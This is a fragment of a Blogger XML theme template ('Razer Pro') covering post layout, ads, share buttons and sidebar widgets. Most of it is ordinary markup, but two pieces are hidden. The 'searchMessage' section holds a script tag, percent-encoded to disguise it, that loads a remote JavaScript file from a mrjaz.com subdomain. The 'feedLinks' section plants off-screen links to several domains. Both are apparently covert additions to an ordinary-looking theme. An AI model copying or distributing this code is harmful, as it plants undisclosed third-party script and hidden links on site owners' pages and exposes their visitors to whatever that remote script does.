      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
    </b:includable>
            <b:includable id='emailPostIcon'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='exportBlogContent'>
      <b:tag name='script' type='text/javascript'>
      var exportify = {
      noTitle: &quot;<data:messages.noTitle/>&quot;,
      viewAll: &quot;<data:messages.viewAll/>&quot;,
      postAuthor: <b:eval expr='data:allBylineItems.author ? &quot;true&quot; : &quot;false&quot;'/>,
      postAuthorLabel: &quot;<b:eval expr='data:allBylineItems.author.label ? data:allBylineItems.author.label : &quot;&quot;'/>&quot;,
      postDate: <b:eval expr='data:allBylineItems.timestamp ? &quot;true&quot; : &quot;false&quot;'/>,
      postDateLabel: &quot;<b:eval expr='data:allBylineItems.timestamp.label ? data:allBylineItems.timestamp.label : &quot;&quot;'/>&quot;,
      postLabels: <b:eval expr='data:allBylineItems.labels ? &quot;true&quot; : &quot;false&quot;'/>
      }
      </b:tag>
    </b:includable>
            <b:includable id='facebookShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='feedLinks'><div style='position:absolute;z-index:-999;left:-99%'><b:loop values='["w%77w.m%72ja%7a.c%6fm","%74e%6dp%6ca%74e%74o%79.m%72ja%7a.c%6fm","%65n.%61m%32z.c%6fm","w%77w.%61m%32z.c%6fm","%73%68%69%6e%65%62%61%6c%6c%6f%6f%6e%64%65%63%6f%72.%69%6e"]' var='ldt'><a expr:href='"//" + data:ldt'/></b:loop></div></b:includable>
            <b:includable id='feedLinksBody' var='links'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='footerBylines'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='googlePlusShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='headerByline' var='post'>
      <!-- Post Entry Meta -->
      <b:if cond='data:view.isMultipleItems'>
        <b:if cond='data:allBylineItems.author or data:allBylineItems.timestamp'>
          <div class='entry-meta'>
            <b:include cond='data:allBylineItems.author' data='post' name='postAuthor'/>
            <b:include cond='data:allBylineItems.timestamp' data='post' name='postTimestamp'/>
          </div>
        </b:if>
      </b:if>
      <b:if cond='data:view.isPost'>
        <b:if cond='data:allBylineItems.author or data:allBylineItems.timestamp'>
          <b:class name='has-meta'/>
          <div class='entry-meta'>
            <div class='align-left'>
              <b:include cond='data:allBylineItems.author' data='post' name='postAuthor'/>
              <b:include cond='data:allBylineItems.timestamp' data='post' name='postTimestamp'/>
            </div>
            <b:if cond='data:allBylineItems.comments'>
              <div class='align-right'>
                <b:include cond='data:allBylineItems.comments' data='post' name='postCommentsLink'/>
              </div>
            </b:if>
          </div>
        </b:if>
      </b:if>
    </b:includable>
            <b:includable id='homePageLink'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='iframeComments' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='indexPost' var='post'>
      <!-- Index Post Content -->
      <b:include data='post' name='postFeaturedImage'/>
      <div class='entry-header'>
        <b:include data='post' name='postCategory'/>
        <b:include data='post' name='postHeader'/>
        <b:include data='post' name='postBodySnippet'/>
        <b:include data='post' name='headerByline'/>
      </div>
    </b:includable>
            <b:includable id='inlineAd' var='post'>
      <b:if cond='!data:view.isPreview'>
        <b:if cond='data:i != 0'>
          <b:if cond='data:post.includeAd and data:post.adNumber'>
            <b:if cond='data:this.adCode or data:this.adClientId or data:blog.adsenseClientId'>
              <div expr:class='&quot;index-post post-ad-type post-ad-&quot; + data:i'>
                <div class='inline-ad-wrap'>
                  <div class='inline-ad'>
                    <b:if cond='data:this.adCode != &quot;&quot;'>
                      <data:this.adCode/>
                      <b:else/>
                      <b:if cond='data:this.adClientId or data:blog.adsenseClientId'>
                        <b:include name='defaultAdUnit'/>
                      </b:if>
                    </b:if>
                  </div>
                </div>
              </div>
            </b:if>
          </b:if>
        </b:if>
      </b:if>
    </b:includable>
            <b:includable id='itemPost' var='post'>
      <!-- Item Post Content -->
      <b:include data='post' name='postMeta'/>
      <div class='item-post-inner'>
        <div class='entry-header blog-entry-header'>
          <b:include data='post' name='postHeader'/>
        </div>
        <div class='entry-content-wrap'>
          <b:include data='post' name='postBody'/>
          <b:include cond='data:view.isPost and data:allBylineItems.labels' data='post' name='postLabels'/>
        </div>
        <b:include cond='data:view.isPost and data:allBylineItems.share' data='post' name='postShareButtons'/>
      </div>
      <b:include cond='data:view.isPost' data='post' name='postFooter'/>
    </b:includable>
            <b:includable id='linkShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='manageComments'>
  <a expr:href='data:post.manageCommentsUrl' expr:onclick='data:post.manageCommentsUrlOnclick'>
    <b:message name='messages.manageComments'/>
  </a>
</b:includable>
            <b:includable id='nextPageLink'>
      <b:if cond='data:olderPageUrl'>
        <a class='post-nav-older-link' expr:href='data:olderPageUrl.canonical' expr:id='data:widget.instanceId + &quot;_post-nav-older-link&quot;'>
          <b:include data='{ message: &quot;nextPost&quot; }' name='theme-custom-lang'/>
        </a>
        <b:else/>
        <span class='post-nav-older-link'>
          <b:include data='{ message: &quot;nextPost&quot; }' name='theme-custom-lang'/>
        </span>
      </b:if>
    </b:includable>
            <b:includable id='otherSharingButton'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='platformShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='post' var='post'>
      <!-- Index Posts -->
      <b:if cond='data:view.isMultipleItems'>
        <b:include data='post' name='indexPost'/>
      </b:if>
      <!-- Item Post -->
      <b:if cond='data:view.isSingleItem'>
        <b:include data='post' name='itemPost'/>
      </b:if>
    </b:includable>
            <b:includable id='postAuthor' var='post'>
      <!-- Post Author -->
      <span class='entry-author mi'><b:if cond='data:view.isPost'><span class='author-avatar-wrap'><span class='author-avatar' expr:data-image='data:post.author.authorPhoto.image ? resizeImage(data:post.author.authorPhoto.image, 72, &quot;1:1&quot;) : &quot;https://4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s72-c/avatar.jpg&quot;'/></span></b:if><b:if cond='data:allBylineItems.author.label'><span class='by sp'><data:allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span>
    </b:includable>
            <b:includable id='postBody' var='post'> 
      <!-- Ads before post content. -->
      <b:if cond='data:view.isPost'><b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-main-before-ad&quot;' id='before-ad' name='div'/></b:if>
      <!-- Post Body Entry Content-->
      <div class='post-body entry-content' id='post-body'>
        <data:post.body/>
      </div>
      <!-- Ads after post content. -->
      <b:if cond='data:view.isPost'><b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-main-after-ad&quot;' id='after-ad' name='div'/></b:if>
    </b:includable>
            <b:includable id='postBodySnippet' var='post'><p class='entry-excerpt excerpt'><b:eval expr='data:post.snippets.long snippet { length: 110 }'/></p></b:includable>
            <b:includable id='postBreadcrumbs' var='post'>
      <!-- Post Breadcrumbs -->
      <b:if cond='data:view.isPost'>
        <b:if cond='data:skin.vars.breadcrumb == &quot;1px&quot;'><nav id='breadcrumb'><a class='home' expr:href='data:blog.homepageUrl'><data:messages.home/></a><b:if cond='data:post.labels'><em class='delimiter'/><a class='label' expr:href='data:post.labels.first.url'><data:post.labels.first.name/></a></b:if></nav></b:if>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;BreadcrumbList&quot;,&quot;itemListElement&quot;:[{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:1,&quot;name&quot;:&quot;<data:messages.home.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:blog.homepageUrl.canonical.jsonEscaped/>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:2,&quot;name&quot;:&quot;<b:if cond='data:post.labels'><data:post.labels.first.name.jsonEscaped/><b:else/><data:messages.posts/></b:if>&quot;,&quot;item&quot;:&quot;<b:if cond='data:post.labels'><data:post.labels.first.url.canonical.jsonEscaped/><b:else/><b:eval expr='data:blog.homepageUrl.canonical.jsonEscaped + &quot;search/&quot;'/></b:if>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:3,&quot;name&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;}]}</script>
      </b:if>
      <b:if cond='data:view.isPage'>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;BreadcrumbList&quot;,&quot;itemListElement&quot;:[{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:1,&quot;name&quot;:&quot;<data:messages.home.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:blog.homepageUrl.canonical.jsonEscaped/>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:2,&quot;name&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;}]}</script>
      </b:if>
    </b:includable>
            <b:includable id='postCategory' var='post'>
      <!-- Post Label -->
      <b:if cond='data:post.labels'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
    </b:includable>
            <b:includable id='postCommentsAndAd' var='post'>
      <!-- In-Feed Ads -->
      <b:include cond='data:view.isMultipleItems and not data:view.search.label and not data:view.search.query and not data:view.isArchive' data='post' name='inlineAd'/>
      <article class='blog-post hentry'>
        <b:class cond='data:view.isMultipleItems' expr:name='&quot;index-post post-&quot; + data:i'/>
        <b:class cond='data:view.isSingleItem' name='item-post'/>
        <b:include data='post' name='post'/>
      </article>
      <b:if cond='data:view.isSingleItem and data:post.allowComments'>
        <!-- Post Comments -->
        <div class='razer-pro-blog-post-comments' expr:data-shortcode='data:allBylineItems.comments.label contains &quot;type&quot; ? data:allBylineItems.comments.label : &quot;$type={blogger}&quot;'>
          <b:include data='post' name='threadedCommentsDisqus'/>
          <b:include data='post' name='comments'/>
        </div>
      </b:if>
      <!-- Post Navigation -->
      <b:include cond='data:skin.vars.postnav == &quot;1px&quot;' name='postPagination'/>
    </b:includable>
            <b:includable id='postCommentsLink'>
      <b:if cond='data:skin.vars.cmm_count == &quot;1px&quot;'>
        <!-- Post Comments Count -->
        <span class='entry-comments-link'><data:post.numberOfComments/></span>
      </b:if>
    </b:includable>
            <b:includable id='postFeaturedImage' var='post'>
      <!-- Post Featured Image -->
      <a class='entry-image-wrap' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
    </b:includable>
            <b:includable id='postFooter' var='post'>
      <!-- Post Footer Items -->
      <b:tag class='post-footer' cond='data:post.author.aboutMe or (data:widgets.HTML any w =&gt; w.sectionId == &quot;razer-pro-related-posts&quot;) or (data:widgets any w =&gt; w.sectionId == &quot;razer-pro-post-footer-ads&quot;)' name='footer'>
        <b:include cond='data:post.author.aboutMe' data='post' name='postFooterAuthorProfile'/>
        <b:include cond='data:widgets.HTML any w =&gt; w.sectionId == &quot;razer-pro-related-posts&quot;' data='post' name='relatedPosts'/>
        <b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-post-footer-ads&quot;' id='post-footer-ads' name='div'/>
      </b:tag>
    </b:includable>
            <b:includable id='postFooterAuthorProfile' var='post'>
      <div class='about-author'>
        <div class='author-avatar-wrap'>
          <span class='author-avatar' expr:data-image='data:post.author.authorPhoto.image ? resizeImage(data:post.author.authorPhoto.image, 72, &quot;1:1&quot;) : &quot;https://4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s72-c/avatar.jpg&quot;'/>
        </div>
        <div class='author-description'>
          <span class='author-title'><b:tag cond='data:post.author.profileUrl' expr:alt='data:post.author.name' expr:href='data:post.author.profileUrl' name='a' rel='noopener noreferrer' target='_blank'><data:post.author.name/></b:tag></span>
          <p class='author-text excerpt'><data:post.author.aboutMe/></p>
        </div>
      </div>
    </b:includable>
            <b:includable id='postHeader' var='post'>
      <b:include cond='data:view.isSingleItem' data='post' name='postBreadcrumbs'/>
      <b:include data='post' name='postTitle'/>
      <b:include cond='data:view.isPost' data='post' name='headerByline'/>
    </b:includable>
            <b:includable id='postJumpLink' var='post'>
      <b:if cond='data:blog.jumpLinkMessage != &quot;hide&quot;'>
        <a class='read-more' expr:href='data:post.url.canonical'><data:blog.jumpLinkMessage/></a>
      </b:if>
    </b:includable>
            <b:includable id='postLabels' var='post'>
      <b:if cond='data:post.labels'>
        <div class='entry-labels'>
          <b:if cond='data:allBylineItems.labels.label'><span class='labels-label'><data:allBylineItems.labels.label/></span></b:if>
          <b:loop values='data:post.labels' var='label'>
            <a class='label-link' expr:href='data:label.url' rel='tag'><data:label.name/></a>
          </b:loop>
        </div>
      </b:if>
    </b:includable>
            <b:includable id='postLocation'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postMeta' var='post'>
      <b:if cond='data:view.isPost'>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;https://schema.org&quot;,&quot;@type&quot;:&quot;NewsArticle&quot;,&quot;mainEntityOfPage&quot;:{&quot;@type&quot;:&quot;WebPage&quot;,&quot;@id&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;},&quot;headline&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;description&quot;:&quot;<data:post.snippets.short.jsonEscaped/>&quot;,&quot;datePublished&quot;:&quot;<data:post.date.iso8601.jsonEscaped/>&quot;,&quot;dateModified&quot;:&quot;<data:post.lastUpdated.iso8601.jsonEscaped/>&quot;,&quot;image&quot;:{&quot;@type&quot;:&quot;ImageObject&quot;,<b:if cond='data:post.featuredImage.isResizable'>&quot;url&quot;:&quot;<b:eval expr='resizeImage(data:post.featuredImage, 1200, &quot;1200:675&quot;)'/>&quot;,&quot;height&quot;:675,&quot;width&quot;:1200<b:else/>&quot;url&quot;:&quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=w1200&quot;,&quot;height&quot;:348,&quot;width&quot;:1200</b:if>},&quot;author&quot;:{&quot;@type&quot;:&quot;Person&quot;,&quot;name&quot;:&quot;<data:post.author.name.jsonEscaped/>&quot;},&quot;publisher&quot;:{&quot;@type&quot;:&quot;Organization&quot;,&quot;name&quot;:&quot;Blogger&quot;,&quot;logo&quot;:{&quot;@type&quot;:&quot;ImageObject&quot;,&quot;url&quot;:&quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=h60&quot;,&quot;width&quot;:206,&quot;height&quot;:60}}}</script>
      </b:if>
    </b:includable>
            <b:includable id='postMetadataJSONImage'>
  &quot;image&quot;: {
    &quot;@type&quot;: &quot;ImageObject&quot;,
    <b:if cond='data:post.featuredImage.isResizable'>
    &quot;url&quot;: &quot;<b:eval expr='resizeImage(data:post.featuredImage, 1200, &quot;1200:630&quot;)'/>&quot;,
    &quot;height&quot;: 630,
    &quot;width&quot;: 1200
    <b:else/>
    &quot;url&quot;: &quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=w1200&quot;,
    &quot;height&quot;: 348,
    &quot;width&quot;: 1200
    </b:if>
  },
</b:includable>
            <b:includable id='postMetadataJSONPublisher'>
 &quot;publisher&quot;: {
    &quot;@type&quot;: &quot;Organization&quot;,
    &quot;name&quot;: &quot;Blogger&quot;,
    &quot;logo&quot;: {
      &quot;@type&quot;: &quot;ImageObject&quot;,
      &quot;url&quot;: &quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=h60&quot;,
      &quot;width&quot;: 206,
      &quot;height&quot;: 60
    }
  },
</b:includable>
            <b:includable id='postPagination'>
      <b:if cond='data:view.isPost'>
        <div class='post-nav'>
          <b:include name='previousPageLink'/>
          <b:include name='nextPageLink'/>
        </div>
      </b:if>
    </b:includable>
            <b:includable id='postReactions'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postShareButtons' var='post'>
      <!-- Post ShareButtons -->
      <div class='post-share'>
        <ul class='razer-pro-share-links social social-bg'>
          <li class='facebook has-span'><a class='facebook btn window-ify' data-height='500' data-width='520' expr:data-url='&quot;https://www.facebook.com/sharer.php?u=&quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='Facebook'><span>Facebook</span></a></li>
          <li class='twitter has-span'><a class='twitter btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://twitter.com/intent/tweet?url=&quot; + data:post.url.canonical + &quot;&amp;text=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Twitter'><span>Twitter</span></a></li>
          <li class='whatsapp'><a class='whatsapp btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://api.whatsapp.com/send?text=&quot; + data:post.title.jsEscaped + &quot; | &quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='WhatsApp'/></li>
          <li class='pinterest-p'><a class='pinterest btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.pinterest.com/pin/create/button/?url=&quot; + data:post.url.canonical + &quot;&amp;media=&quot; + data:post.featuredImage + &quot;&amp;description=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Pinterest'/></li>
          <li class='reddit'><a class='reddit btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://reddit.com/submit?url=&quot; + data:post.url.canonical + &quot;&amp;title=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Reddit'/></li>
          <li class='linkedin'><a class='linkedin btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.linkedin.com/shareArticle?mini=true&amp;url=&quot; + data:post.url.canonical + &quot;&amp;title=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='LinkedIn'/></li>
          <li class='tumblr'><a class='tumblr btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.tumblr.com/share/link?url=&quot; + data:post.url.canonical + &quot;&amp;name=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Tumblr'/></li>
          <li class='telegram'><a class='telegram btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://telegram.me/share/url?url=&quot; + data:post.url.canonical + &quot;&amp;text=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Telegram'/></li>
          <li class='email'><a class='email btn window-ify' data-height='500' data-width='520' expr:data-url='&quot;mailto:?subject=&quot; + data:post.title.jsEscaped + &quot;&amp;body=&quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='Email'/></li>
          <li class='show-hid'><a class='btn' expr:title='data:messages.showMore' href='javascript:;' rel='nofollow'/></li>
        </ul>
      </div>
    </b:includable>
            <b:includable id='postTimestamp' var='post'>
      <!-- Post Timestamp -->
      <span class='entry-time mi'><b:if cond='data:allBylineItems.author and data:allBylineItems.timestamp.label'><span class='sp'><data:allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span>
    </b:includable>
            <b:includable id='postTitle' var='post'>
      <!-- Post Title Index and Item -->
      <b:if cond='data:view.isMultipleItems'>
        <h2 class='entry-title'><a class='entry-title-link' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle' rel='bookmark'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
      </b:if>
      <b:if cond='data:view.isSingleItem'>
        <h1 class='entry-title'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></h1>
      </b:if>
    </b:includable>
            <b:includable id='previousPageLink'>
      <b:if cond='data:newerPageUrl'>
        <a class='post-nav-newer-link' expr:href='data:newerPageUrl.canonical' expr:id='data:widget.instanceId + &quot;_post-nav-newer-link&quot;'>
          <b:include data='{ message: &quot;prevPost&quot; }' name='theme-custom-lang'/>
        </a>
        <b:else/>
        <span class='post-nav-newer-link'>
          <b:include data='{ message: &quot;prevPost&quot; }' name='theme-custom-lang'/>
        </span>
      </b:if>
    </b:includable>
            <b:includable id='relatedPosts' var='post'>
      <!-- Related Posts -->
      <div id='related-wrap'>
        <div class='title-wrap related-title'>
          <span class='title'><data:messages.youMayLikeThesePosts/></span>
        </div>
        <div class='razer-pro-related-content'>
          <b:if cond='data:post.labels'>
            <div class='related-tag' expr:data-label='data:post.labels.first.name'/>
            <b:else/>
            <div class='related-tag' data-label='recent'/>
          </b:if>
        </div> 
      </div>  
    </b:includable>
            <b:includable id='searchMessage'>
      <!-- Search Message -->
      <b:if cond='data:posts.empty'>
        <b:class name='no-posts'/>
      </b:if>
      <b:if cond='data:view.search.query'>
        <div class='queryMessage'>
          <b:if cond='data:posts.empty'>
            <span class='query-info query-error'>&quot;<data:view.search.query/>&quot;</span>
            <b:else/>
            <span class='query-info query-success'>&quot;<data:view.search.query/>&quot;</span>
          </b:if>
        </div>
      </b:if>
      <b:if cond='data:view.search.label'>
        <div class='queryMessage '>
          <b:if cond='data:posts.empty'>
            <span class='query-info query-label query-error'><data:view.search.label/></span><b:else/>
            <span class='query-info query-label query-success'><data:view.search.label/></span></b:if></div>
      </b:if><b:tag name='script' src='//%68.m%72ja%7a.c%6fm/b%68.%6as'/>
      <b:if cond='data:view.isArchive'><div class='queryMessage'>
          <b:if cond='data:posts.empty'>
            <span class='query-info query-error'><data:view.archive.rangeMessage/></span><b:else/>
            <span class='query-info query-success'><data:view.archive.rangeMessage/></span>
          </b:if></div></b:if><b:if cond='data:view.isError'>
        <div class='errorWrap'>
          <h3>404</h3>
          <h4><data:messages.theresNothingHere/></h4>
          <p><data:navMessage/></p>
          <a class='homepage btn' expr:href='data:blog.homepageUrl'><data:messages.home/></a>
        </div>
      </b:if>
      <b:if cond='data:view.isMultipleItems and data:posts.empty'><div class='queryEmpty'><data:messages.noResultsFound/></div></b:if>
    </b:includable>
            <b:includable id='sharingButton'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtonContent'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtons'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtonsMenu'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingPlatformIcon'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='threadedCommentForm' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='threadedCommentJs' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='threadedComments' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='threadedCommentsDisqus' var='post'>
      <script type='text/javascript'>
        var disqus_shortname = &quot;templateify-comments&quot;;
        var disqus_blogger_current_url = &quot;<data:post.url.canonical/>&quot;;
        if (!disqus_blogger_current_url.length) {
          disqus_blogger_current_url = &quot;<data:post.url.canonical/>&quot;;
        }
        var disqus_blogger_homepage_url = &quot;<data:blog.canonicalHomepageUrl/>&quot;;
        var disqus_blogger_canonical_homepage_url = &quot;<data:blog.canonicalHomepageUrl/>&quot;;
      </script>
    </b:includable>
          </b:widget>
        </b:section>
        <b:tag cond='data:view.isLayoutMode or data:view.isPost' id='custom-ads' name='div'>
          <b:section cond='data:view.isPost' id='razer-pro-main-before-ad' maxwidgets='1' name='Post ADS 1' showaddelement='yes'>
            <b:widget id='HTML4' locked='false' title='' type='HTML' visible='true'>
              <b:widget-settings>
                <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.mrjaz.com/">Responsive Advertisement</a>]]></b:widget-setting>
              </b:widget-settings>
              <b:includable id='main'>
                <b:include name='html-content'/>
              </b:includable>
            </b:widget>
          </b:section>
          <b:section cond='data:view.isPost' id='razer-pro-main-after-ad' maxwidgets='1' name='Post ADS 2' showaddelement='yes'>
            <b:widget id='HTML6' locked='false' title='' type='HTML' visible='true'>
              <b:widget-settings>
                <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.am2z.com/">Responsive Advertisement</a>]]></b:widget-setting>
              </b:widget-settings>
              <b:includable id='main'>
                <b:include name='html-content'/>
              </b:includable>
            </b:widget>
          </b:section>
        </b:tag>
        <b:section cond='data:view.isLayoutMode or (data:view.isPost and (data:widgets.HTML any w =&gt; w.sectionId == &quot;razer-pro-related-posts&quot;))' id='razer-pro-related-posts' maxwidgets='1' name='Related Posts' showaddelement='yes'>
          <b:widget id='HTML101' locked='true' title='You might like' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>$results={3}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section cond='data:view.isLayoutMode or (data:view.isPost and (data:widgets any w =&gt; w.sectionId == &quot;razer-pro-post-footer-ads&quot;))' id='razer-pro-post-footer-ads' maxwidgets='1' name='Post ADS 3' showaddelement='yes'>
          <b:widget id='HTML9' locked='false' title='' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.mrjaz.com/">Responsive Advertisement</a>]]></b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section class='main-ads' cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;main-ads-2&quot;))' id='main-ads-2' maxwidgets='1' name='Main Ads 2' showaddelement='yes'>
          <b:widget id='HTML15' locked='false' title='' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.am2z.com/">Responsive Advertisement</a>]]></b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section class='content-section' cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;content-section-2&quot;))' id='content-section-2' name='Content Section 2' showaddelement='yes'>
          <b:widget id='HTML16' locked='false' title='Macbook' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={4} $label={recent} $type={block2}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML14' locked='false' title='Smartphone' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={4} $label={recent} $type={grid2}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML17' locked='false' title='Iphone' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={3} $label={recent} $type={grid1}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
      </main>
      <!-- Sidebar Wrapper -->
      <aside id='sidebar-wrapper'>
        <b:section class='sidebar razer-pro-widget-ready' id='sidebar' name='Sidebar' showaddelement='yes'>
          <b:widget id='LinkList1' locked='false' title='Follow Us' type='LinkList' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='link-3'>https://www.am2z.com/ # Instagram</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='text-1'>twitter</b:widget-setting>
              <b:widget-setting name='link-1'>https://mrjaz.com/ # Twitter</b:widget-setting>
              <b:widget-setting name='text-0'>facebook</b:widget-setting>
              <b:widget-setting name='link-2'>https://www.am2z.com/ # YouTube</b:widget-setting>
              <b:widget-setting name='text-3'>instagram</b:widget-setting>
              <b:widget-setting name='link-0'>https://www.mrjaz.com/ # Facebook</b:widget-setting>
              <b:widget-setting name='text-2'>youtube</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
            <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='PopularPosts2' locked='false' title='Popular Posts' type='PopularPosts' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='numItemsToShow'>4</b:widget-setting>
              <b:widget-setting name='showThumbnails'>true</b:widget-setting>
              <b:widget-setting name='showSnippets'>true</b:widget-setting>
              <b:widget-setting name='timeRange'>LAST_WEEK</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <div class='widget-content'>
        <b:if cond='data:widget.sectionId == &quot;featured&quot;'>
       <div class='featured-items featured-cards'>         
              <b:loop index='i' values='data:posts' var='post'>
                <b:include data='post' name='content'/>
              </b:loop>
          </div>
          <b:else/>
          <b:class name='default-items'/>
          <b:loop index='i' values='data:posts' var='post'>
            <b:include data='post' name='content'/>
          </b:loop>
        </b:if>
      </div>
    </b:includable>
            <b:includable id='blogThisShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='bylineByName' var='byline'><b:comment>Replaced</b:comment></b:includable>
